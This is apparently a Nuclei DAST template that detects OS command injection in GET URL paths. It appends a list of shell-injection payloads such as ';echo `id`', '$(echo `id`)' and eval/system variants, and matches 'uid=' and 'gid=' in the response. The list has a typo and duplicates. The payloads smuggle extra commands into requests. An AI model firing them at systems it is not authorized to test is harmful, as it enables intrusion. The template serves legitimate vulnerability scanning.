http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  method: GET
  path:
  - '{{BaseURL}}/{{rce}}'
  payloads:
    rce:
    - ;echo `id`
    - ';echo `id` #'
    - ;echo `id` ;
    - '& echo `id` #'
    - '& echo `id` &'
    - '| echo `id`'
    - '# echo `id`'
    - '| echo `id`'
    - $(echo `id`)
    - '|| echo `id`'
    - '| echo `id` |'
    - '|| echo `id` ||'
    - ;echo `id`;
    - '` ehoc test `'
    - '%0a echo `id` %0a '
    - ;echo `id`|
    - ;|/usr/bin/echo `id`|
    - "\n/bin/echo `id` \n"
    - ;system('echo `id`')
    - ;system('echo `id`')
    - ;system('echo `id`')
    - eval('echo `id`')
    - eval('echo `id`');
    - response.write `id`
    - :response.write `id`
  stop-at-first-match: true
id: rce-injection-uri
info:
  author: reewardius
  description: Template to check for os command Injection vulnerabilities in GET  Url
    must be https://target.com/site={we will put local host here}
  name: OS Injection Get Detection for GET parameters
  severity: critical
  tags: fuzzing-rce,generic,dast
